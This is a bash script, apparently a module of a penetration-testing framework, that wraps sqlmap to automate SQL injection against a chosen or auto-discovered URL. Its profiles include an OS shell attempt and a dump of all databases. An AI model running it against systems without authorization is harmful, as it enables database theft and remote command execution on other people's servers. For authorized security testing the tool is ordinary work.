#!/usr/bin/env bash
source "$(dirname "$0")/../lib.sh"
set -uo pipefail

banner "SQLMAP" "automated SQL injection · detection · extraction · os-shell"

require_tool sqlmap "apt install sqlmap"

outdir="$(make_outdir)"
outfile="$outdir/sqlmap.log"
: > "$outfile"

_cleanup() { mark_done "$outdir"; }
trap '_cleanup' EXIT

# ── Target URL ─────────────────────────────────────────────────────────────────
section "TARGET"

_extra_hdrs=""; _proxy=""; _threads=1; _tech=""

if [[ -n "${SESSION_DIR:-}" ]]; then
  # Pipeline: derive URL from chain_ports.txt or TARGET
  TARGET_URL=""
  # Prefer chain_web_urls.txt (actual discovered URLs from web.sh)
  if [[ -s "${SESSION_DIR}/chain_web_urls.txt" ]]; then
    TARGET_URL=$(head -1 "${SESSION_DIR}/chain_web_urls.txt")
    printf '  %s[CHAIN]%s URL from chain_web_urls.txt: %s%s\n' "${CYAN}" "${RESET}" "$TARGET_URL" "${RESET}"
  elif [[ -s "${SESSION_DIR}/chain_ports.txt" ]]; then
    while IFS=: read -r _cp_ip _cp_port; do
      case "$_cp_port" in
        443|8443) TARGET_URL="https://$_cp_ip/"; break ;;
        80|8080)  TARGET_URL="http://$_cp_ip/";  break ;;
      esac
    done < "${SESSION_DIR}/chain_ports.txt"
  fi
  [[ -z "$TARGET_URL" ]] && TARGET_URL="http://${TARGET%%/*}/"
  _LEVEL=3; _RISK=2; _EXTRA="--forms --batch"
  _threads=3
  printf '  %s[CHAIN]%s URL: %s  Profile: Standard+forms  Threads: 3  (pipeline auto)%s\n\n' \
    "${CYAN}" "${RESET}" "$TARGET_URL" "${RESET}"
else
  # Auto-load URLs from web module sessions
  _BASE="$(cd "$(dirname "$0")/.." && pwd)"
  declare -a _WEB_URLS=()
  while IFS= read -r _logfile; do
    while IFS= read -r _line; do
      if [[ "$_line" =~ https?://[^[:space:]\"]+ ]]; then
        _WEB_URLS+=("${BASH_REMATCH[0]}")
      fi
    done < "$_logfile"
  done < <(find "$_BASE/results" -name 'web.log' -o -name 'nikto.log' 2>/dev/null | head -20)

  if [[ ${#_WEB_URLS[@]} -gt 0 ]]; then
    printf '  %s[+]%s URLs found in web session logs:\n\n' "${GREEN}" "${RESET}"
    local_idx=0
    for _url in "${_WEB_URLS[@]:0:10}"; do
      printf '  %s[%02d]%s  %s\n' "${CYAN}" "$(( local_idx + 1 ))" "${RESET}" "$_url"
      (( local_idx++ ))
    done
    printf '\n  %s>>%s Select URL number or press Enter to type manually: ' "${CYAN}" "${RESET}"
    read -r _pick
    if [[ "$_pick" =~ ^[0-9]+$ ]] && (( _pick >= 1 && _pick <= ${#_WEB_URLS[@]} )); then
      TARGET_URL="${_WEB_URLS[$(( _pick - 1 ))]}"
    fi
  fi

  if [[ -z "${TARGET_URL:-}" ]]; then
    printf '  %s>>%s URL (e.g. http://192.168.1.1/page.php?id=1): ' "${CYAN}" "${RESET}"
    read -r TARGET_URL
  fi

  [[ -z "${TARGET_URL:-}" ]] && { printf '  %s[!]%s No URL provided\n' "${RED}" "${RESET}"; exit 1; }

  section "SCAN PROFILE"
  printf '  %s[01]%s Quick    — level 1, risk 1, GET params only           %s(fast)%s\n'    "${CYAN}" "${RESET}" "${DIM}" "${RESET}"
  printf '  %s[02]%s Standard — level 3, risk 2, GET + POST, forms         %s(balanced)%s\n' "${CYAN}" "${RESET}" "${DIM}" "${RESET}"
  printf '  %s[03]%s Deep     — level 5, risk 3, all params, all techniques %s(thorough)%s\n' "${CYAN}" "${RESET}" "${DIM}" "${RESET}"
  printf '  %s[04]%s OS Shell — standard + attempt os-shell after injection\n'                "${CYAN}" "${RESET}"
  printf '  %s[05]%s Dump DB  — standard + dump all databases\n'                              "${CYAN}" "${RESET}"
  printf '\n  %s>>%s Profile [1]: ' "${CYAN}" "${RESET}"
  read -r _profile; _profile="${_profile:-1}"
  case "$_profile" in
    2) _LEVEL=3; _RISK=2; _EXTRA="--forms" ;;
    3) _LEVEL=5; _RISK=3; _EXTRA="--forms --all" ;;
    4) _LEVEL=3; _RISK=2; _EXTRA="--forms --os-shell" ;;
    5) _LEVEL=3; _RISK=2; _EXTRA="--forms --dump-all" ;;
    *) _LEVEL=1; _RISK=1; _EXTRA="" ;;
  esac

  printf '\n  %s>>%s Additional headers / cookies (blank = none): ' "${CYAN}" "${RESET}"
  read -r _extra_hdrs
  printf '  %s>>%s HTTP proxy (blank = none, e.g. 127.0.0.1:8080): ' "${CYAN}" "${RESET}"
  read -r _proxy
  printf '  %s>>%s Threads [1]: ' "${CYAN}" "${RESET}"
  read -r _threads; _threads="${_threads:-1}"
  printf '  %s>>%s Technique (BEUSTQ, blank = auto): ' "${CYAN}" "${RESET}"
  read -r _tech
fi

# ── Run ────────────────────────────────────────────────────────────────────────
section "SQLMAP"

printf '  %s[SYS]%s URL     : %s%s%s\n'   "${CYAN}" "${RESET}" "${GREEN}" "$TARGET_URL" "${RESET}"
printf '  %s[SYS]%s Profile : level %s  risk %s%s\n' "${CYAN}" "${RESET}" "$_LEVEL" "$_RISK" "${RESET}"
printf '  %s[SYS]%s Log     : %s%s%s\n\n' "${CYAN}" "${RESET}" "${DIM}" "$outfile" "${RESET}"

_SQLMAP_OUT="$outdir/sqlmap_output"
mkdir -p "$_SQLMAP_OUT"

declare -a _args=(
  -u "$TARGET_URL"
  --level="$_LEVEL"
  --risk="$_RISK"
  --batch
  --random-agent
  --threads="$_threads"
  --output-dir="$_SQLMAP_OUT"
)

[[ -n "$_EXTRA" ]]     && _args+=($_EXTRA)
[[ -n "$_extra_hdrs" ]] && _args+=(-H "$_extra_hdrs")
[[ -n "$_proxy" ]]      && _args+=(--proxy="http://$_proxy")
[[ -n "$_tech" ]]        && _args+=(--technique="$_tech")

run_fg sqlmap "${_args[@]}" 2>&1 | tee -a "$outfile" || true

printf '\n  %s[SYS]%s Log        : %s%s%s\n'    "${CYAN}" "${RESET}" "${DIM}" "$outfile" "${RESET}"
printf '  %s[SYS]%s sqlmap dir : %s%s%s\n\n'   "${CYAN}" "${RESET}" "${DIM}" "$_SQLMAP_OUT" "${RESET}"
